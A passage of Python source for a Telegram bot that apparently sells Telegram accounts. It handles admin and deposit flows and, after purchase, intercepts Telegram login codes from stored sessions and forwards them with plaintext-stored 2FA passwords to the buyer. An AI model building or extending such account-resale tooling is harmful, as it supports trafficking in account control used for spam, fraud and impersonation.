                        parse_mode='html'
                    )
                except ValueError:
                    await event.respond("<b>❌ Invalid Price. Try again:</b>", parse_mode='html')
                return

            # ---------- CHANGE PRICE FLOW ----------
            elif state == "AWAITING_CHANGE_PRICE_PHONE":
                phone = text.strip()
                conn = get_db_connection()
                row = conn.execute("SELECT * FROM accounts WHERE phone=?", (phone,)).fetchone()
                conn.close()
                if not row:
                    await event.respond("❌ Account not found.", buttons=get_owner_keyboard())
                    user_states.pop(user_id, None)
                    return
                user_states[user_id] = {"state": "AWAITING_CHANGE_PRICE_AMOUNT", "phone": phone}
                await event.respond(
                    f"<b>🏷️ Current Price:</b> <code>₹{row['price']}</code>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "Send the new price:",
                    buttons=cancel_button(), parse_mode='html'
                )
                return

            elif state == "AWAITING_CHANGE_PRICE_AMOUNT":
                try:
                    new_price = float(text)
                    phone = state_info["phone"]
                    conn = get_db_connection()
                    conn.execute("UPDATE accounts SET price=? WHERE phone=?", (new_price, phone))
                    conn.commit()
                    conn.close()
                    user_states.pop(user_id, None)
                    await event.respond(
                        "<b>✅ Price Updated</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"📱 Phone: <code>{phone}</code>\n"
                        f"💰 New Price: <code>₹{new_price}</code>",
                        buttons=get_owner_keyboard(), parse_mode='html'
                    )
                except ValueError:
                    await event.respond("<b>❌ Invalid Price. Try again:</b>", parse_mode='html')
                return

            # ---------- EDIT ACC FLOW ----------
            elif state == "AWAITING_EDIT_PHONE":
                phone = text.strip()
                conn = get_db_connection()
                row = conn.execute("SELECT * FROM accounts WHERE phone=?", (phone,)).fetchone()
                conn.close()
                if not row:
                    await event.respond("❌ Account not found.", buttons=get_owner_keyboard())
                    user_states.pop(user_id, None)
                    return
                user_states[user_id] = {"state": "AWAITING_EDIT_COUNTRY", "phone": phone}
                await event.respond(
                    f"<b>✏️ Editing Account</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"Current Country: <code>{row['country'] or 'N/A'}</code>\n\n"
                    "Send New Country:",
                    buttons=cancel_button(), parse_mode='html'
                )
                return

            elif state == "AWAITING_EDIT_COUNTRY":
                country = text.strip()
                user_states[user_id]["country"] = country
                user_states[user_id]["state"] = "AWAITING_EDIT_PRICE"
                await event.respond("💰 <b>Send New Price:</b>", buttons=cancel_button(), parse_mode='html')
                return

            elif state == "AWAITING_EDIT_PRICE":
                try:
                    price = float(text)
                except ValueError:
                    await event.respond("❌ Invalid Price. Try again:", parse_mode='html')
                    return
                phone = state_info["phone"]
                country = state_info["country"]
                conn = get_db_connection()
                conn.execute("UPDATE accounts SET country=?, price=? WHERE phone=?", (country, price, phone))
                conn.commit()
                conn.close()
                user_states.pop(user_id, None)
                await event.respond(
                    "<b>✅ Account Updated</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 Phone: <code>{phone}</code>\n"
                    f"🌍 Country: <code>{country}</code>\n"
                    f"💰 Price: <code>₹{price}</code>",
                    buttons=get_owner_keyboard(), parse_mode='html'
                )
                return

            # ---------- REMOVE ACC FLOW ----------
            elif state == "AWAITING_REMOVE_PHONE":
                phone = text.strip()
                conn = get_db_connection()
                row = conn.execute("SELECT * FROM accounts WHERE phone=?", (phone,)).fetchone()
                if not row:
                    conn.close()
                    await event.respond("❌ Account not found.", buttons=get_owner_keyboard())
                    user_states.pop(user_id, None)
                    return
                conn.close()

                try:
                    session_file = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
                    client = TelegramClient(session_file, API_ID, API_HASH)
                    await client.connect()
                    if await client.is_user_authorized():
                        await client.log_out()
                    await client.disconnect()
                except Exception as log_e:
                    logger.error(f"Logout Error: {log_e}")

                try:
                    session_path = session_file + ".session"
                    if os.path.exists(session_path):
                        os.remove(session_path)
                except Exception as file_e:
                    logger.error(f"File Delete Error: {file_e}")

                conn = get_db_connection()
                conn.execute("DELETE FROM accounts WHERE phone=?", (phone,))
                conn.commit()
                conn.close()
                user_states.pop(user_id, None)
                await event.respond(
                    f"<b>✅ Account Removed Successfully</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 <code>{phone}</code>",
                    buttons=get_owner_keyboard(), parse_mode='html'
                )
                return

            # ---------- SET REFERRAL BONUS ----------
            elif state == "AWAITING_REF_BONUS":
                try:
                    amount = float(text)
                    if amount < 0:
                        await event.respond("❌ Bonus can't be negative.", parse_mode='html')
                        return
                    set_referral_bonus(amount)
                    user_states.pop(user_id, None)
                    await event.respond(
                        "<b>✅ Referral Bonus Updated</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"🎁 New Bonus: <code>₹{amount}</code>",
                        buttons=get_owner_keyboard(), parse_mode='html'
                    )
                except ValueError:
                    await event.respond("❌ Invalid amount. Try again:", parse_mode='html')
                return

            # ---------- BROADCAST FLOW ----------
            elif state == 'AWAITING_ANNOUNCEMENT':
                if text == "/done":
                    messages = state_info.get('messages', [])
                    if not messages:
                        await event.respond("<b>⚠️ No messages provided.</b>",
                                            buttons=get_owner_keyboard(), parse_mode='html')
                    else:
                        progress_msg = await event.respond("<b>⏳ Starting Broadcast...</b>", parse_mode='html')
                        conn = get_db_connection()
                        all_users = [row['user_id'] for row in conn.execute("SELECT user_id FROM users").fetchall()]
                        conn.close()
                        success_count = 0
                        for i, uid in enumerate(all_users):
                            try:
                                for msg in messages:
                                    await bot.send_message(uid, msg)
                                success_count += 1
                                if (i + 1) % 5 == 0:
                                    await progress_msg.edit(
                                        f"<b>⏳ Broadcasting...</b>\nProgress: <code>{success_count}/{len(all_users)}</code>",
                                        parse_mode='html'
                                    )
                            except Exception:
                                continue
                            await asyncio.sleep(0.05)
                        await progress_msg.edit(
                            f"<b>✅ Broadcast Complete!</b>\nSent to: <code>{success_count}</code> users.",
                            buttons=get_owner_keyboard(), parse_mode='html'
                        )
                    user_states.pop(user_id, None)
                else:
                    state_info['messages'].append(event.message)
                    await event.respond(
                        "<b>📥 Message Captured.</b>\nSend another or type <code>/done</code> to broadcast.",
                        parse_mode='html'
                    )
                return

            # ---------- ADD FUND FLOW ----------
            elif state == 'AWAITING_ADD_FUND_UID':
                try:
                    target_id = int(text)
                    user_states[user_id] = {'state': 'AWAITING_ADD_FUND_AMOUNT', 'target_id': target_id}
                    await event.respond(
                        f"<b>💰 Add Funds to User</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"User ID: <code>{target_id}</code>\n\n"
                        "Enter the amount to add:",
                        buttons=cancel_button(), parse_mode='html'
                    )
                except ValueError:
                    await event.respond("<b>❌ Invalid User ID.</b>", parse_mode='html')
                return

            elif state == 'AWAITING_ADD_FUND_AMOUNT':
                try:
                    amount = float(text)
                    target_id = state_info['target_id']
                    init_user(target_id)
                    if update_user_balance(target_id, amount):
                        await event.respond(
                            "<b>✅ Balance Added</b>\n"
                            "━━━━━━━━━━━━━━━━━━━━\n"
                            f"👤 User: <code>{target_id}</code>\n"
                            f"💰 Added: <code>+₹{amount}</code>",
                            buttons=get_owner_keyboard(), parse_mode='html'
                        )
                        try:
                            await bot.send_message(
                                target_id,
                                f"<b>💰 Funds Added!</b>\n"
                                "━━━━━━━━━━━━━━━━━━━━\n"
                                f"Your account has been credited with <code>₹{amount}</code>.",
                                parse_mode='html'
                            )
                        except Exception:
                            pass
                    else:
                        await event.respond("<b>❌ Database Error.</b>",
                                            buttons=get_owner_keyboard(), parse_mode='html')
                    user_states.pop(user_id, None)
                except ValueError:
                    await event.respond("<b>❌ Invalid Amount.</b>", parse_mode='html')
                return

            # ---------- OWNER REJECT REASON ----------
            elif state == 'AWAITING_REJECT_REASON':
                reason = text.strip()
                dep_id = state_info['deposit_id']
                target_uid = state_info['target_uid']
                amount = state_info['amount']

                conn = get_db_connection()
                conn.execute("UPDATE deposits SET status='rejected', reject_reason=? WHERE id=?",
                             (reason, dep_id))
                conn.commit()
                conn.close()

                try:
                    await bot.send_message(
                        target_uid,
                        "<b>❌ Deposit Request Rejected</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"💰 Amount: <code>₹{amount}</code>\n"
                        f"📝 Reason: <code>{reason}</code>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "<i>Please contact support if you think this is a mistake.</i>",
                        parse_mode='html'
                    )
                except Exception:
                    pass

                user_states.pop(user_id, None)
                await event.respond(
                    "<b>✅ Deposit Rejected & User Notified</b>",
                    buttons=get_owner_keyboard(), parse_mode='html'
                )
                return

        # ==================== USER SIDE ====================

        # ✅ BAN CHECK FOR NON-OWNER USERS (all interactions)
        if user_id not in OWNER_IDS and user_exists(user_id) and is_user_banned(user_id):
            await event.respond(
                "<b>🚫 YOU ARE BANNED</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "You have been banned from using this bot.\n"
                f"Contact support: {SUPPORT_USERNAME}",
                parse_mode='html'
            )
            return

        if text == "👤 ACCOUNT":
            balance = get_user_balance(user_id)
            r_count, r_earn = get_referral_stats(user_id)
            await event.respond(
                "<b>👤 YOUR ACCOUNT DASHBOARD</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"🆔 User ID: <code>{user_id}</code>\n"
                f"💰 Balance: <b>₹{balance}</b>\n"
                f"🎁 Referrals: <code>{r_count}</code>\n"
                f"💵 Ref Earnings: <code>₹{r_earn}</code>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "<i>To add funds, tap on 💳 ADD FUND.</i>",
                parse_mode='html'
            )
            return

        elif text == "🎁 REFERRAL":
            r_count, r_earn = get_referral_stats(user_id)
            bonus = get_referral_bonus()
            link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
            share_text = (
                f"🔥 Join this amazing bot to buy premium Telegram accounts!\n"
                f"Use my link: {link}"
            )
            share_url = f"https://t.me/share/url?url={link}&text={share_text}"
            await event.respond(
                "<b>🎁 REFERRAL PROGRAM</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"💰 Per Referral: <code>₹{bonus}</code>\n"
                f"👥 Total Referrals: <code>{r_count}</code>\n"
                f"💵 Total Earned: <code>₹{r_earn}</code>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "🔗 <b>Your Referral Link:</b>\n"
                f"<code>{link}</code>\n\n"
                "<i>Share this link with friends. When they join, you earn instantly!</i>",
                buttons=[
                    [Button.url("📤 SHARE LINK", share_url)],
                    [Button.inline("🏠 Main Menu", b"main_menu")],
                ],
                parse_mode='html'
            )
            return

        elif text == "🆘 SUPPORT":
            await event.respond(
                "<b>🆘 SUPPORT</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"Contact: {SUPPORT_USERNAME}\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "<i>We usually reply within a few minutes.</i>",
                parse_mode='html'
            )
            return

        elif text == "🛒 BUY":
            await event.respond(
                "<b>🖥️ SELECT SERVER</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "<i>Choose a server to view available accounts.</i>",
                buttons=server_select_buttons("buy"),
                parse_mode='html'
            )
            return

        # ---------- DEPOSIT / ADD FUND FLOW ----------
        elif text == "💳 ADD FUND":
            if has_pending_deposit(user_id):
                await event.respond(
                    "<b>⏳ Pending Request Exists</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "You already have a deposit request pending verification.\n"
                    "Please wait for admin approval before sending another.",
                    parse_mode='html'
                )
                return

            user_states[user_id] = {"state": "AWAITING_DEPOSIT_AMOUNT"}
            await event.respond(
                "<b>💳 ADD FUND</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"Enter the amount you want to deposit (INR):\n"
                f"<i>Minimum deposit: ₹{int(MIN_DEPOSIT)}</i>\n\n"
                "<i>Example: 100, 500, 1000</i>",
                buttons=cancel_button(), parse_mode='html'
            )
            return

        if state == "AWAITING_DEPOSIT_AMOUNT":
            try:
                amount = float(text)
                if amount <= 0:
                    await event.respond("❌ Amount must be greater than 0.", parse_mode='html')
                    return

                # ✅ MINIMUM DEPOSIT CHECK
                if amount < MIN_DEPOSIT:
                    await event.respond(
                        f"<b>❌ Minimum Deposit is ₹{int(MIN_DEPOSIT)}</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"Please enter an amount of at least <code>₹{int(MIN_DEPOSIT)}</code>.",
                        parse_mode='html'
                    )
                    return

                loading = await event.respond("⏳ <b>Generating QR...</b>", parse_mode='html')

                try:
                    qr_buffer = generate_qr(amount)
                    await loading.delete()

                    user_states[user_id] = {
                        "state": "AWAITING_UTR",
                        "amount": amount
                    }

                    caption = (
                        "<b>💳 PAYMENT DETAILS</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"💰 Amount: <code>₹{amount}</code>\n"
                        f"🏦 UPI ID: <code>{UPI_ID}</code>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "📸 Scan the QR above or pay directly to the UPI ID.\n\n"
                        "After paying, tap <b>✅ VERIFY PAYMENT</b>.\n"
                        "<i>You will need to enter your UTR / Transaction ID.</i>"
                    )

                    await bot.send_file(
                        event.chat_id,
                        qr_buffer,
                        caption=caption,
                        buttons=[[Button.inline("✅ VERIFY PAYMENT", b"verify_payment")]],
                        parse_mode="html"
                    )
                except Exception as e:
                    try:
                        await loading.delete()
                    except Exception:
                        pass
                    await event.respond(f"<b>❌ QR Error:</b> <code>{str(e)}</code>", parse_mode='html')
                    user_states.pop(user_id, None)
            except ValueError:
                await event.respond("❌ Invalid amount. Send a valid number:", parse_mode='html')
            return

        # ==================== UTR HANDLER ====================
        if state == "AWAITING_UTR":
            utr = text.strip()
            if len(utr) < 4:
                await event.respond("❌ UTR / Transaction ID too short. Send again:", parse_mode='html')
                return

            user_states[user_id] = {
                "state": "AWAITING_SCREENSHOT",
                "amount": state_info["amount"],
                "utr": utr
            }

            await event.respond(
                "<b>📸 SEND PAYMENT SCREENSHOT</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"ID received: <code>{utr}</code>\n\n"
                "Now please send the payment screenshot as proof of your transaction.",
                buttons=cancel_button(), parse_mode='html'
            )
            return

        # ==================== SCREENSHOT HANDLER ====================
        if state == "AWAITING_SCREENSHOT":
            if not event.photo:
                await event.respond(
                    "<b>📸 Please send a PHOTO of your payment screenshot.</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "<i>Only image allowed. Tap ❌ Cancel to abort.</i>",
                    parse_mode='html'
                )
                return

            utr = state_info.get("utr")
            amount = state_info.get("amount")
            screenshot_file_id = event.photo.id

            screenshot_buffer = BytesIO()
            await event.download_media(file=screenshot_buffer)
            screenshot_buffer.seek(0)
            screenshot_buffer.name = f"screenshot_{user_id}.jpg"

            conn = get_db_connection()
            cursor = conn.execute(
                "INSERT INTO deposits (user_id, utr, amount, status, screenshot) VALUES (?, ?, ?, 'pending', ?)",
                (user_id, utr, amount, str(screenshot_file_id))
            )
            dep_id = cursor.lastrowid
            conn.commit()
            conn.close()

            user_states.pop(user_id, None)

            await event.respond(
                "<b>⏳ Request Submitted</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"💰 Amount: <code>₹{amount}</code>\n"
                f"🧾 UTR: <code>{utr}</code>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "<i>Your request has been sent to admin. Please wait for approval.</i>",
                parse_mode='html'
            )

            owner_caption = (
                "<b>💰 NEW DEPOSIT REQUEST</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 User ID: <code>{user_id}</code>\n"
                f"💰 Amount: <code>₹{amount}</code>\n"
                f"🧾 UTR / Txn: <code>{utr}</code>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "<i>Verify payment and choose an action below.</i>"
            )
            owner_buttons = [
                [Button.inline("✅ APPROVE", f"dep_approve_{dep_id}"),
                 Button.inline("❌ REJECT", f"dep_reject_{dep_id}")]
            ]

            for owner in OWNER_IDS:
                try:
                    screenshot_buffer.seek(0)
                    await bot.send_file(
                        owner,
                        screenshot_buffer,
                        caption=owner_caption,
                        buttons=owner_buttons,
                        parse_mode='html'
                    )
                except Exception as e:
                    logger.error(f"Owner notify failed: {e}")
                    try:
                        await bot.send_message(
                            owner,
                            owner_caption + f"\n\n⚠️ Screenshot attached failed to send.",
                            buttons=owner_buttons,
                            parse_mode='html'
                        )
                    except Exception:
                        pass
            return

    # -------------------- CALLBACK HANDLER --------------------
    @bot.on(events.CallbackQuery)
    async def callback_handler(event):
        user_id = event.sender_id
        data = event.data.decode("utf-8")
        state_info = user_states.get(user_id, {})

        # 🔒 FORCE JOIN CHECK
        if user_id not in OWNER_IDS and data != "check_force_join" and not await check_force_join(bot, user_id):
            await event.answer("🔒 Please join the channel first.", alert=True)
            return

        # ✅ BAN CHECK FOR CALLBACKS
        if user_id not in OWNER_IDS and user_exists(user_id) and is_user_banned(user_id):
            await event.answer("🚫 You are banned from using this bot.", alert=True)
            return

        if data == "check_force_join":
            if await check_force_join(bot, user_id):
                referral_result = process_pending_referral(user_id)

                if referral_result:
                    referrer_id, bonus = referral_result
                    try:
                        await bot.send_message(
                            referrer_id,
                            "<b>🎉 NEW REFERRAL JOINED!</b>\n"
                            "━━━━━━━━━━━━━━━━━━━━\n"
                            f"👤 User: <code>{user_id}</code>\n"
                            f"💰 Bonus Credited: <code>+₹{bonus}</code>\n"
                            "━━━━━━━━━━━━━━━━━━━━",
                            parse_mode='html'
                        )
                    except Exception:
                        pass

                kb = get_owner_keyboard() if user_id in OWNER_IDS else get_user_keyboard()
                await event.edit(
                    "<b>✅ Membership Verified</b>\n\n"
                    "Welcome! You can now use the bot.",
                    buttons=kb,
                    parse_mode="html"
                )
            else:
                await event.answer("❌ You haven't joined the channel yet.", alert=True)
            return

        if data == "main_menu":
            kb = get_owner_keyboard() if user_id in OWNER_IDS else get_user_keyboard()
            await event.edit("<b>🏠 Main Menu</b>", buttons=kb, parse_mode='html')
            return

        # ---------- ADMIN: Server select for ADD ACC ----------
        if data.startswith("addacc_"):
            if user_id not in OWNER_IDS:
                await event.answer("❌ Not authorized", alert=True)
                return
            server = data.replace("addacc_", "")
            if server not in SERVERS:
                await event.answer("❌ Invalid server", alert=True)
                return

            phone = state_info.get("phone")
            country = state_info.get("country")
            password = state_info.get("password", "N/A")
            price = state_info.get("price")

            if not phone or not country or price is None:
                await event.answer("⚠️ Session expired. Start again.", alert=True)
                return

            try:
                conn = get_db_connection()
                conn.execute(
                    "INSERT INTO accounts (phone, country, price, password, server) VALUES (?, ?, ?, ?, ?)",
                    (phone, country, price, password, server)
                )
                conn.commit()
                conn.close()

                if state_info.get("client"):
                    try:
                        await state_info["client"].disconnect()
                    except Exception:
                        pass

                user_states.pop(user_id, None)

                await event.edit(
                    "<b>✅ Account Added Successfully</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 Phone: <code>{phone}</code>\n"
                    f"🌍 Country: <code>{country}</code>\n"
                    f"💰 Price: <code>₹{price}</code>\n"
                    f"🖥️ Server: <code>{server}</code>",
                    buttons=get_owner_keyboard(), parse_mode='html'
                )
            except Exception as e:
                await event.edit(f"<b>❌ Error:</b> <code>{str(e)}</code>",
                                 buttons=get_owner_keyboard(), parse_mode='html')
            return

        # ---------- USER: Server select for BUY ----------
        if data.startswith("buy_"):
            if "_Server " not in data:
                pass
            else:
                server = data.replace("buy_", "")
                if server not in SERVERS:
                    await event.answer("❌ Invalid server", alert=True)
                    return

                conn = get_db_connection()
                countries = conn.execute("""
                    SELECT country, price, COUNT(*) as total
                    FROM accounts
                    WHERE status='available' AND server=?
                    GROUP BY country, price
                    ORDER BY price ASC
                """, (server,)).fetchall()
                conn.close()

                if not countries:
                    await event.edit(
                        f"<b>📭 Out Of Stock on {server}!</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "<i>Try another server.</i>",
                        buttons=[
                            [Button.inline("🔙 Back", b"back_servers"),
                             Button.inline("🏠 Menu", b"main_menu")]
                        ],
                        parse_mode='html'
                    )
                    return

                msg = (
                    f"<b>✨ SELECT ACCOUNT — {server}</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n\n"
                )
                buttons = []
                row = []
                for c in countries:
                    msg += f"🌍 <b>{c['country']}</b> | ₹{c['price']} | {c['total']} in stock\n"
                    row.append(Button.inline(f"{c['country']} • ₹{c['price']}",
                                             data=f"srv_{server}__{c['country']}"))
                    if len(row) == 2:
                        buttons.append(row)
                        row = []
                if row:
                    buttons.append(row)
                buttons.append([Button.inline("🔙 Back", b"back_servers"),
                                Button.inline("🏠 Menu", b"main_menu")])
                await event.edit(msg, buttons=buttons, parse_mode='html')
                return

        if data == "back_servers":
            await event.edit(
                "<b>🖥️ SELECT SERVER</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "<i>Choose a server to view available accounts.</i>",
                buttons=server_select_buttons("buy"),
                parse_mode='html'
            )
            return

        # ---------- USER: Country selected ----------
        if data.startswith("srv_"):
            try:
                payload = data.replace("srv_", "")
                server, country = payload.split("__", 1)
            except Exception:
                await event.answer("❌ Invalid data", alert=True)
                return

            conn = get_db_connection()
            acc = conn.execute("""
                SELECT * FROM accounts
                WHERE country=? AND server=? AND status='available'
                ORDER BY RANDOM() LIMIT 1
            """, (country, server)).fetchone()
            conn.close()

            if not acc:
                await event.answer("❌ No stock available", alert=True)
                return

            await event.edit(
                "<b>🛒 ACCOUNT DETAILS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"🖥️ Server: <code>{server}</code>\n"
                f"🌍 Country: <code>{country}</code>\n"
                f"📱 Number: <code>{mask_phone(acc['phone'])}</code>\n"
                f"💰 Price: <code>₹{acc['price']}</code>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "⚡ Verified Account\n"
                "🔐 OTP Forwarding Supported\n"
                "<i>Tap Buy to continue.</i>",
                buttons=[
                    [Button.inline("✅ BUY", f"buyid_{acc['id']}")],
                    [Button.inline("🔙 Back", f"buy_{server}")]
                ],
                parse_mode="html"
            )
            return

        # ---------- USER: Buy ----------
        if data.startswith("buyid_"):
            acc_id = int(data.split("_")[1])
            conn = get_db_connection()
            acc = conn.execute("SELECT * FROM accounts WHERE id = ?", (acc_id,)).fetchone()
            conn.close()

            if not acc or acc['status'] != 'available':
                await event.answer("⚠️ This ID was just sold!", alert=True)
                return

            balance = get_user_balance(user_id)
            if balance < acc['price']:
                await event.answer(f"❌ Insufficient Balance! Needs ₹{acc['price']}", alert=True)
                return

            await event.edit(
                "<b>🧾 PURCHASE CONFIRMATION</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 Number: <code>{mask_phone(acc['phone'])}</code>\n"
                f"💵 Price: <b>₹{acc['price']}</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "<i>OTPs will be auto-forwarded to this chat after purchase.</i>",
                buttons=[
                    [Button.inline("✅ CONFIRM & PAY", f"confirm_{acc_id}")],
                    [Button.inline("❌ Cancel", b"cancel_buy")]
                ],
                parse_mode='html'
            )
            return

        if data.startswith("confirm_"):
            acc_id = int(data.split("_")[1])
            conn = get_db_connection()
            acc = conn.execute("SELECT * FROM accounts WHERE id = ?", (acc_id,)).fetchone()

            if not acc or acc['status'] != 'available':
                await event.answer("Error: ID unavailable.")
                conn.close()
                return

            balance = get_user_balance(user_id)
            if balance < acc['price']:
                await event.answer("Insufficient funds.")
                conn.close()
                return

            conn.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (acc['price'], user_id))
            conn.execute("UPDATE accounts SET status = 'sold' WHERE id = ?", (acc_id,))
            conn.commit()
            conn.close()

            try:
                await bot.send_message(
                    SOLD_CHANNEL,
                    "<b>🚀 NEW SALE COMPLETED</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "📦 <b>Product:</b> Telegram Account\n"
                    f"📱 <b>Number:</b> <code>{mask_phone(acc['phone'])}</code>\n"
                    f"🌎 <b>Region:</b> <code>{acc['country']}</code>\n"
                    f"🖥️ <b>Server:</b> <code>{acc['server']}</code>\n"
                    f"💵 <b>Sale Price:</b> <code>₹{acc['price']}</code>\n"
                    f"🆔 <b>Buyer:</b> <code>{user_id}</code>\n"
                    "━━━━━━━━━━━━━━━━━━━━",
                    buttons=[[Button.url("🤖 Buy Accounts Here", "http://t.me/TGxACCOUNTxSTORE_BOT")]],
                    parse_mode="html"
                )
            except Exception as e:
                logger.warning(f"Sold channel error: {e}")

            await event.edit(
                "<b>🎉 PURCHASE SUCCESSFUL!</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"📦 Account: <code>{acc['phone']}</code>\n"
                "📩 <b>OTP Status:</b> Monitoring for codes...\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "<i>Please wait for the official Telegram OTP.</i>",
                parse_mode='html'
            )
            asyncio.create_task(start_otp_forwarding(acc['phone'], user_id, bot, otp_clients))
            return

        if data == "cancel_buy":
            await event.edit("<b>⚠️ Purchase cancelled.</b>", parse_mode='html')
            return

        # ---------- VERIFY PAYMENT ----------
        if data == "verify_payment":
            current_state = user_states.get(user_id, {})
            st = current_state.get("state")

            if st == "AWAITING_SCREENSHOT":
                await event.respond(
                    "<b>📸 SEND PAYMENT SCREENSHOT</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "Please send a <b>photo</b> of your payment confirmation / screenshot.\n\n"
                    "<i>Make sure the amount and UTR are clearly visible.</i>",
                    buttons=cancel_button(), parse_mode='html'
                )
                return

            if st != "AWAITING_UTR":
                conn = get_db_connection()
                pend = conn.execute(
                    "SELECT * FROM deposits WHERE user_id=? AND status='pending' ORDER BY id DESC LIMIT 1",
                    (user_id,)
                ).fetchone()
                conn.close()
                if pend:
                    user_states[user_id] = {"state": "AWAITING_UTR", "amount": pend['amount']}
                else:
                    await event.answer("⚠️ No deposit to verify. Start again.", alert=True)
                    return

            await event.respond(
                "<b>🧾 ENTER UTR / TRANSACTION ID</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "Send the UTR / Transaction ID from your payment app:",
                buttons=cancel_button(), parse_mode='html'
            )
            return

        # ---------- APPROVE DEPOSIT ----------
        if data.startswith("dep_approve_"):
            if user_id not in OWNER_IDS:
                await event.answer("❌ Not authorized", alert=True)
                return

            dep_id = int(data.split("_")[2])
            conn = get_db_connection()
            dep = conn.execute("SELECT * FROM deposits WHERE id=?", (dep_id,)).fetchone()
            if not dep:
                conn.close()
                await event.answer("⚠️ Request not found", alert=True)
                return
            if dep['status'] != 'pending':
                conn.close()
                await event.answer("⚠️ Already processed", alert=True)
                return

            init_user(dep['user_id'])
            update_user_balance(dep['user_id'], dep['amount'])
            conn.execute("UPDATE deposits SET status='approved' WHERE id=?", (dep_id,))
            conn.commit()
            conn.close()

            try:
                await bot.send_message(
                    dep['user_id'],
                    "<b>✅ Deposit Approved!</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"💰 Amount: <code>₹{dep['amount']}</code>\n"
                    f"🧾 UTR: <code>{dep['utr']}</code>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "<i>Funds have been added to your account.</i>",
                    parse_mode='html'
                )
            except Exception:
                pass

            try:
                await event.edit(
                    "<b>✅ DEPOSIT APPROVED</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 User: <code>{dep['user_id']}</code>\n"
                    f"💰 Amount: <code>₹{dep['amount']}</code>\n"
                    f"🧾 UTR: <code>{dep['utr']}</code>",
                    parse_mode='html'
                )
            except Exception:
                pass
            return

        # ---------- REJECT DEPOSIT ----------
        if data.startswith("dep_reject_"):
            if user_id not in OWNER_IDS:
                await event.answer("❌ Not authorized", alert=True)
                return

            dep_id = int(data.split("_")[2])
            conn = get_db_connection()
            dep = conn.execute("SELECT * FROM deposits WHERE id=?", (dep_id,)).fetchone()
            conn.close()
            if not dep:
                await event.answer("⚠️ Request not found", alert=True)
                return
            if dep['status'] != 'pending':
                await event.answer("⚠️ Already processed", alert=True)
                return

            user_states[user_id] = {
                "state": "AWAITING_REJECT_REASON",
                "deposit_id": dep_id,
                "target_uid": dep['user_id'],
                "amount": dep['amount']
            }
            await event.respond(
                "<b>❌ REJECT DEPOSIT</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 User: <code>{dep['user_id']}</code>\n"
                f"💰 Amount: <code>₹{dep['amount']}</code>\n"
                f"🧾 UTR: <code>{dep['utr']}</code>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "Send the <b>reason</b> for rejection:",
                buttons=cancel_button(), parse_mode='html'
            )
            return

    # ------------------------------------------------------------------
    # OTP FORWARDING
    # ------------------------------------------------------------------
    async def start_otp_forwarding(phone, user_id, bot_ref, otp_clients_ref):
        if phone in otp_clients_ref:
            return

        session_file = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
        client = TelegramClient(session_file, API_ID, API_HASH)

        try:
            await client.connect()
            if not await client.is_user_authorized():
                await client.disconnect()
                return

            otp_clients_ref[phone] = {"client": client, "user_id": user_id}

            @client.on(events.NewMessage(from_users=777000))
            async def otp_handler(event):
                text = event.raw_text
                otp = "".join(re.findall(r"\d+", text))

                conn = get_db_connection()
                row = conn.execute("SELECT password FROM accounts WHERE phone=?", (phone,)).fetchone()
                conn.close()
                password = row["password"] if row else "N/A"

                await bot_ref.send_message(
                    user_id,
                    "<b>📩 NEW OTP RECEIVED</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 <b>Account:</b> <code>{phone}</code>\n"
                    f"🔐 <b>OTP:</b> <code>{otp}</code>\n"
                    f"🔑 <b>PASS:</b> <code>{password}</code>\n"
